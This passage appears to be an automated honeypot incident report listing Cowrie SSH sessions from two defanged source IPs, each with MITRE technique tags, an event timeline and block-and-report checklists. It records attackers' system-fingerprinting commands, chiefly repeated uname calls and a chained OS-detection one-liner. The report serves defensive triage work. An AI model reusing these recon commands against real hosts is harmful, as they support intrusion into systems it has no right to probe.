| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:11` | `cowrie.session.connect` |
| `2026-08-15 05:34:11` | `cowrie.client.version` |
| `2026-08-15 05:34:11` | `cowrie.client.kex` |
| `2026-08-15 05:34:13` | `cowrie.login.success` |
| `2026-08-15 05:34:15` | `cowrie.session.params` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:15` | `cowrie.command.success` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:15` | `cowrie.command.input` |
| `2026-08-15 05:34:16` | `cowrie.log.closed` |
| `2026-08-15 05:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d382dce25a9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:15` | `cowrie.session.connect` |
| `2026-08-15 05:34:15` | `cowrie.client.version` |
| `2026-08-15 05:34:16` | `cowrie.client.kex` |
| `2026-08-15 05:34:16` | `cowrie.login.success` |
| `2026-08-15 05:34:17` | `cowrie.session.params` |
| `2026-08-15 05:34:17` | `cowrie.command.input` |
| `2026-08-15 05:34:17` | `cowrie.log.closed` |
| `2026-08-15 05:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8cbb8125d9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:21` | `cowrie.session.connect` |
| `2026-08-15 05:34:21` | `cowrie.client.version` |
| `2026-08-15 05:34:21` | `cowrie.client.kex` |
| `2026-08-15 05:34:21` | `cowrie.login.success` |
| `2026-08-15 05:34:22` | `cowrie.session.params` |
| `2026-08-15 05:34:22` | `cowrie.command.input` |
| `2026-08-15 05:34:23` | `cowrie.log.closed` |
| `2026-08-15 05:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d1d21aeb54

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:26` | `cowrie.session.connect` |
| `2026-08-15 05:34:26` | `cowrie.client.version` |
| `2026-08-15 05:34:26` | `cowrie.client.kex` |
| `2026-08-15 05:34:27` | `cowrie.login.success` |
| `2026-08-15 05:34:27` | `cowrie.session.params` |
| `2026-08-15 05:34:27` | `cowrie.command.input` |
| `2026-08-15 05:34:27` | `cowrie.log.closed` |
| `2026-08-15 05:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad6b0f234ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:31` | `cowrie.session.connect` |
| `2026-08-15 05:34:31` | `cowrie.client.version` |
| `2026-08-15 05:34:31` | `cowrie.client.kex` |
| `2026-08-15 05:34:32` | `cowrie.login.success` |
| `2026-08-15 05:34:33` | `cowrie.session.params` |
| `2026-08-15 05:34:33` | `cowrie.command.input` |
| `2026-08-15 05:34:33` | `cowrie.log.closed` |
| `2026-08-15 05:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-442d0e29dd2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:37` | `cowrie.session.connect` |
| `2026-08-15 05:34:37` | `cowrie.client.version` |
| `2026-08-15 05:34:37` | `cowrie.client.kex` |
| `2026-08-15 05:34:38` | `cowrie.login.success` |
| `2026-08-15 05:34:39` | `cowrie.session.params` |
| `2026-08-15 05:34:39` | `cowrie.command.input` |
| `2026-08-15 05:34:39` | `cowrie.log.closed` |
| `2026-08-15 05:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d326b835243

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:42` | `cowrie.session.connect` |
| `2026-08-15 05:34:42` | `cowrie.client.version` |
| `2026-08-15 05:34:42` | `cowrie.client.kex` |
| `2026-08-15 05:34:43` | `cowrie.login.success` |
| `2026-08-15 05:34:44` | `cowrie.session.params` |
| `2026-08-15 05:34:44` | `cowrie.command.input` |
| `2026-08-15 05:34:44` | `cowrie.log.closed` |
| `2026-08-15 05:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de6cfaf7dda5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:48` | `cowrie.session.connect` |
| `2026-08-15 05:34:48` | `cowrie.client.version` |
| `2026-08-15 05:34:48` | `cowrie.client.kex` |
| `2026-08-15 05:34:48` | `cowrie.login.success` |
| `2026-08-15 05:34:49` | `cowrie.session.params` |
| `2026-08-15 05:34:49` | `cowrie.command.input` |
| `2026-08-15 05:34:49` | `cowrie.log.closed` |
| `2026-08-15 05:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e7b7fe593dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:53` | `cowrie.session.connect` |
| `2026-08-15 05:34:53` | `cowrie.client.version` |
| `2026-08-15 05:34:53` | `cowrie.client.kex` |
| `2026-08-15 05:34:54` | `cowrie.login.success` |
| `2026-08-15 05:34:54` | `cowrie.session.params` |
| `2026-08-15 05:34:54` | `cowrie.command.input` |
| `2026-08-15 05:34:55` | `cowrie.log.closed` |
| `2026-08-15 05:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fd9d6ca71ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:34 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:34:58` | `cowrie.session.connect` |
| `2026-08-15 05:34:58` | `cowrie.client.version` |
| `2026-08-15 05:34:58` | `cowrie.client.kex` |
| `2026-08-15 05:34:59` | `cowrie.login.success` |
| `2026-08-15 05:35:00` | `cowrie.session.params` |
| `2026-08-15 05:35:00` | `cowrie.command.input` |
| `2026-08-15 05:35:00` | `cowrie.log.closed` |
| `2026-08-15 05:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4242ae0c5d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:04` | `cowrie.session.connect` |
| `2026-08-15 05:35:04` | `cowrie.client.version` |
| `2026-08-15 05:35:04` | `cowrie.client.kex` |
| `2026-08-15 05:35:04` | `cowrie.login.success` |
| `2026-08-15 05:35:06` | `cowrie.session.params` |
| `2026-08-15 05:35:06` | `cowrie.command.input` |
| `2026-08-15 05:35:06` | `cowrie.log.closed` |
| `2026-08-15 05:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41654f489f58

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:09` | `cowrie.session.connect` |
| `2026-08-15 05:35:09` | `cowrie.client.version` |
| `2026-08-15 05:35:09` | `cowrie.client.kex` |
| `2026-08-15 05:35:10` | `cowrie.login.success` |
| `2026-08-15 05:35:11` | `cowrie.session.params` |
| `2026-08-15 05:35:11` | `cowrie.command.input` |
| `2026-08-15 05:35:11` | `cowrie.log.closed` |
| `2026-08-15 05:35:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc155ab9767

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:14` | `cowrie.session.connect` |
| `2026-08-15 05:35:14` | `cowrie.client.version` |
| `2026-08-15 05:35:15` | `cowrie.client.kex` |
| `2026-08-15 05:35:15` | `cowrie.login.success` |
| `2026-08-15 05:35:17` | `cowrie.session.params` |
| `2026-08-15 05:35:17` | `cowrie.command.input` |
| `2026-08-15 05:35:18` | `cowrie.log.closed` |
| `2026-08-15 05:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8e92e0b2fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:20` | `cowrie.session.connect` |
| `2026-08-15 05:35:20` | `cowrie.client.version` |
| `2026-08-15 05:35:20` | `cowrie.client.kex` |
| `2026-08-15 05:35:20` | `cowrie.login.success` |
| `2026-08-15 05:35:22` | `cowrie.session.params` |
| `2026-08-15 05:35:22` | `cowrie.command.input` |
| `2026-08-15 05:35:22` | `cowrie.log.closed` |
| `2026-08-15 05:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d5916cb09c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:25` | `cowrie.session.connect` |
| `2026-08-15 05:35:25` | `cowrie.client.version` |
| `2026-08-15 05:35:25` | `cowrie.client.kex` |
| `2026-08-15 05:35:26` | `cowrie.login.success` |
| `2026-08-15 05:35:27` | `cowrie.session.params` |
| `2026-08-15 05:35:27` | `cowrie.command.input` |
| `2026-08-15 05:35:27` | `cowrie.log.closed` |
| `2026-08-15 05:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5563dfdd18e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:30` | `cowrie.session.connect` |
| `2026-08-15 05:35:30` | `cowrie.client.version` |
| `2026-08-15 05:35:31` | `cowrie.client.kex` |
| `2026-08-15 05:35:31` | `cowrie.login.success` |
| `2026-08-15 05:35:33` | `cowrie.session.params` |
| `2026-08-15 05:35:33` | `cowrie.command.input` |
| `2026-08-15 05:35:34` | `cowrie.log.closed` |
| `2026-08-15 05:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7739636423f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:36` | `cowrie.session.connect` |
| `2026-08-15 05:35:36` | `cowrie.client.version` |
| `2026-08-15 05:35:36` | `cowrie.client.kex` |
| `2026-08-15 05:35:37` | `cowrie.login.success` |
| `2026-08-15 05:35:38` | `cowrie.session.params` |
| `2026-08-15 05:35:38` | `cowrie.command.input` |
| `2026-08-15 05:35:38` | `cowrie.log.closed` |
| `2026-08-15 05:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45b08d5fefa7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:41` | `cowrie.session.connect` |
| `2026-08-15 05:35:41` | `cowrie.client.version` |
| `2026-08-15 05:35:41` | `cowrie.client.kex` |
| `2026-08-15 05:35:42` | `cowrie.login.success` |
| `2026-08-15 05:35:44` | `cowrie.session.params` |
| `2026-08-15 05:35:44` | `cowrie.command.input` |
| `2026-08-15 05:35:44` | `cowrie.log.closed` |
| `2026-08-15 05:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea071e67310d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:47` | `cowrie.session.connect` |
| `2026-08-15 05:35:47` | `cowrie.client.version` |
| `2026-08-15 05:35:47` | `cowrie.client.kex` |
| `2026-08-15 05:35:47` | `cowrie.login.success` |
| `2026-08-15 05:35:48` | `cowrie.session.params` |
| `2026-08-15 05:35:48` | `cowrie.command.input` |
| `2026-08-15 05:35:48` | `cowrie.log.closed` |
| `2026-08-15 05:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a5ffd41b03a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:52` | `cowrie.session.connect` |
| `2026-08-15 05:35:52` | `cowrie.client.version` |
| `2026-08-15 05:35:52` | `cowrie.client.kex` |
| `2026-08-15 05:35:53` | `cowrie.login.success` |
| `2026-08-15 05:35:54` | `cowrie.session.params` |
| `2026-08-15 05:35:54` | `cowrie.command.input` |
| `2026-08-15 05:35:54` | `cowrie.log.closed` |
| `2026-08-15 05:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d951ac8e11

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:35 |
| **Last Seen** | 2026-08-15 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:35:57` | `cowrie.session.connect` |
| `2026-08-15 05:35:57` | `cowrie.client.version` |
| `2026-08-15 05:35:57` | `cowrie.client.kex` |
| `2026-08-15 05:35:58` | `cowrie.login.success` |
| `2026-08-15 05:35:58` | `cowrie.session.params` |
| `2026-08-15 05:35:58` | `cowrie.command.input` |
| `2026-08-15 05:35:59` | `cowrie.log.closed` |
| `2026-08-15 05:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79d66bd6935

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:03` | `cowrie.session.connect` |
| `2026-08-15 05:36:03` | `cowrie.client.version` |
| `2026-08-15 05:36:03` | `cowrie.client.kex` |
| `2026-08-15 05:36:03` | `cowrie.login.success` |
| `2026-08-15 05:36:04` | `cowrie.session.params` |
| `2026-08-15 05:36:04` | `cowrie.command.input` |
| `2026-08-15 05:36:04` | `cowrie.log.closed` |
| `2026-08-15 05:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-948bf846e131

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:08` | `cowrie.session.connect` |
| `2026-08-15 05:36:08` | `cowrie.client.version` |
| `2026-08-15 05:36:08` | `cowrie.client.kex` |
| `2026-08-15 05:36:09` | `cowrie.login.success` |
| `2026-08-15 05:36:09` | `cowrie.session.params` |
| `2026-08-15 05:36:09` | `cowrie.command.input` |
| `2026-08-15 05:36:09` | `cowrie.log.closed` |
| `2026-08-15 05:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8cd8f65e62c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:36:13` | `cowrie.session.connect` |
| `2026-08-15 05:36:13` | `cowrie.client.version` |
| `2026-08-15 05:36:13` | `cowrie.client.kex` |
| `2026-08-15 05:36:14` | `cowrie.login.success` |
| `2026-08-15 05:36:15` | `cowrie.session.params` |
| `2026-08-15 05:36:15` | `cowrie.command.input` |
| `2026-08-15 05:36:15` | `cowrie.log.closed` |
| `2026-08-15 05:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e0e74f24620

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:36 |
| **Last Seen** | 2026-08-15 05:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
